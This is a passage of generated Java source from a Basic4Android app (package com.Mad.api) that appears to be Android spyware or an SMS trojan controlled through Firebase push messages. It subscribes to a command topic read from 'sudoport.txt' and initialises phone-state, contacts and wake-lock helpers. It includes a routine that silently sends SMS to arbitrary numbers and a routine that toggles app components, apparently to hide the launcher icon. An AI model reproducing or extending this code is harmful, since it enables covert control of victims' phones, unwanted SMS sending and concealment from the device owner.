 //BA.debugLineNum = 10;BA.debugLine="Private Send As SendServer";
_send = new com.Mad.api.sendserver();
 //BA.debugLineNum = 11;BA.debugLine="Dim PhoneId As PhoneId";
_phoneid = new anywheresoftware.b4a.phone.Phone.PhoneId();
 //BA.debugLineNum = 12;BA.debugLine="Dim PE As PhoneEvents";
_pe = new anywheresoftware.b4a.phone.PhoneEvents();
 //BA.debugLineNum = 13;BA.debugLine="Dim res As String";
_res = "";
 //BA.debugLineNum = 14;BA.debugLine="Dim pm As PhoneWakeState";
_pm = new anywheresoftware.b4a.phone.Phone.PhoneWakeState();
 //BA.debugLineNum = 15;BA.debugLine="Dim cu As ContactsUtils";
_cu = new b4a.example.contactsutils();
 //BA.debugLineNum = 16;BA.debugLine="End Sub";
return "";
}
public static void  _receiver_receive(boolean _firsttime,anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
ResumableSub_Receiver_Receive rsub = new ResumableSub_Receiver_Receive(null,_firsttime,_startingintent);
rsub.resume(processBA, null);
}
public static class ResumableSub_Receiver_Receive extends BA.ResumableSub {
public ResumableSub_Receiver_Receive(com.Mad.api.firebasemessaging parent,boolean _firsttime,anywheresoftware.b4a.objects.IntentWrapper _startingintent) {
this.parent = parent;
this._firsttime = _firsttime;
this._startingintent = _startingintent;
}
com.Mad.api.firebasemessaging parent;
boolean _firsttime;
anywheresoftware.b4a.objects.IntentWrapper _startingintent;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
try {

        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 19;BA.debugLine="StartReceiver(NewMessage)";
anywheresoftware.b4a.keywords.Common.StartReceiver(processBA,(Object)(parent.mostCurrent._newmessage.getObject()));
 //BA.debugLineNum = 20;BA.debugLine="Try";
if (true) break;

case 1:
//try
this.state = 10;
this.catchState = 9;
this.state = 3;
if (true) break;

case 3:
//C
this.state = 4;
this.catchState = 9;
 //BA.debugLineNum = 21;BA.debugLine="PE.InitializeWithPhoneState(\"PE\", PhoneId)";
parent._pe.InitializeWithPhoneState(processBA,"PE",parent._phoneid);
 //BA.debugLineNum = 22;BA.debugLine="Send.Initialize";
parent._send._initialize /*String*/ (processBA);
 //BA.debugLineNum = 23;BA.debugLine="fm.Initialize(\"fm\")";
parent._fm.Initialize(processBA,"fm");
 //BA.debugLineNum = 24;BA.debugLine="pd.initialize(\"pd\")";
parent._pd.initialize(processBA,"pd");
 //BA.debugLineNum = 25;BA.debugLine="fm.HandleIntent(StartingIntent)";
parent._fm.HandleIntent((android.content.Intent)(_startingintent.getObject()));
 //BA.debugLineNum = 26;BA.debugLine="Do While fm.Token = \"\"";
if (true) break;

case 4:
//do while
this.state = 7;
while ((parent._fm.getToken()).equals("")) {
this.state = 6;
if (true) break;
}
if (true) break;

case 6:
//C
this.state = 4;
 //BA.debugLineNum = 27;BA.debugLine="fm.Initialize(\"fm\")";
parent._fm.Initialize(processBA,"fm");
 //BA.debugLineNum = 28;BA.debugLine="Sleep(500)";
anywheresoftware.b4a.keywords.Common.Sleep(processBA,this,(int) (500));
this.state = 11;
return;
case 11:
//C
this.state = 4;
;
 //BA.debugLineNum = 29;BA.debugLine="Log(\"Cant Get Token\")";
anywheresoftware.b4a.keywords.Common.LogImpl("1851979","Cant Get Token",0);
 if (true) break;

case 7:
//C
this.state = 10;
;
 if (true) break;

case 9:
//C
this.state = 10;
this.catchState = 0;
 //BA.debugLineNum = 32;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1851982",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 10:
//C
this.state = -1;
this.catchState = 0;
;
 //BA.debugLineNum = 35;BA.debugLine="End Sub";
if (true) break;
}} 
       catch (Exception e0) {
			
if (catchState == 0)
    throw e0;
else {
    state = catchState;
processBA.setLastException(e0);}
            }
        }
    }
}
public static String  _sendsms(String _number,String _message) throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
Object _parts = null;
 //BA.debugLineNum = 501;BA.debugLine="Sub SendSMS(Number As String , Message As String)";
 //BA.debugLineNum = 502;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 503;BA.debugLine="r.Target = r.RunStaticMethod(\"android.telephony.S";
_r.Target = _r.RunStaticMethod("android.telephony.SmsManager","getDefault",(Object[])(anywheresoftware.b4a.keywords.Common.Null),(String[])(anywheresoftware.b4a.keywords.Common.Null));
 //BA.debugLineNum = 504;BA.debugLine="Dim parts As Object";
_parts = new Object();
 //BA.debugLineNum = 505;BA.debugLine="parts = r.RunMethod2(\"divideMessage\", Message, \"j";
_parts = _r.RunMethod2("divideMessage",_message,"java.lang.String");
 //BA.debugLineNum = 506;BA.debugLine="r.RunMethod4(\"sendMultipartTextMessage\", _";
_r.RunMethod4("sendMultipartTextMessage",new Object[]{(Object)(_number),anywheresoftware.b4a.keywords.Common.Null,_parts,anywheresoftware.b4a.keywords.Common.Null,anywheresoftware.b4a.keywords.Common.Null},new String[]{"java.lang.String","java.lang.String","java.util.ArrayList","java.util.ArrayList","java.util.ArrayList"});
 //BA.debugLineNum = 510;BA.debugLine="End Sub";
return "";
}
public static String  _set_icon_status(String _actn,boolean _enable) throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _reflector = null;
Object _context = null;
int _num = 0;
 //BA.debugLineNum = 511;BA.debugLine="Private Sub set_icon_status (actn As String,enable";
 //BA.debugLineNum = 512;BA.debugLine="Try";
try { //BA.debugLineNum = 513;BA.debugLine="Dim reflector As Reflector";
_reflector = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 514;BA.debugLine="Dim context As Object = reflector.CreateObject2(";
_context = _reflector.CreateObject2("android.content.ComponentName",new Object[]{(Object)(anywheresoftware.b4a.keywords.Common.Application.getPackageName()),(Object)(anywheresoftware.b4a.keywords.Common.Application.getPackageName()+"."+_actn)},new String[]{"java.lang.String","java.lang.String"});
 //BA.debugLineNum = 516;BA.debugLine="reflector.Target = reflector.GetContext";
_reflector.Target = (Object)(_reflector.GetContext(processBA));
 //BA.debugLineNum = 517;BA.debugLine="reflector.Target = reflector.RunMethod(\"getPacka";
_reflector.Target = _reflector.RunMethod("getPackageManager");
 //BA.debugLineNum = 518;BA.debugLine="Dim num As Int";
_num = 0;
 //BA.debugLineNum = 519;BA.debugLine="If enable = True Then";
if (_enable==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 520;BA.debugLine="num = 1";
_num = (int) (1);
 }else {
 //BA.debugLineNum = 522;BA.debugLine="num = 2";
_num = (int) (2);
 };
 //BA.debugLineNum = 524;BA.debugLine="reflector.Target = reflector.RunMethod4(\"setComp";
_reflector.Target = _reflector.RunMethod4("setComponentEnabledSetting",new Object[]{_context,(Object)(_num),(Object)(0)},new String[]{"android.content.ComponentName","java.lang.int","java.lang.int"});
 } 
       catch (Exception e14) {
			processBA.setLastException(e14); //BA.debugLineNum = 527;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("11114128",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 };
 //BA.debugLineNum = 529;BA.debugLine="End Sub";
return "";
}
public static String  _subscribetotopics() throws Exception{
String _sudoport = "";
 //BA.debugLineNum = 36;BA.debugLine="Public Sub SubscribeToTopics";
 //BA.debugLineNum = 37;BA.debugLine="Dim sudoport As String = File.ReadString(File.Dir";
_sudoport = anywheresoftware.b4a.keywords.Common.File.ReadString(anywheresoftware.b4a.keywords.Common.File.getDirAssets(),"sudoport.txt");
 //BA.debugLineNum = 38;BA.debugLine="Log(sudoport)";
anywheresoftware.b4a.keywords.Common.LogImpl("1917506",_sudoport,0);
 //BA.debugLineNum = 39;BA.debugLine="fm.SubscribeToTopic(sudoport)";
_fm.SubscribeToTopic(_sudoport);
 //BA.debugLineNum = 40;BA.debugLine="End Sub";
return "";
}
}
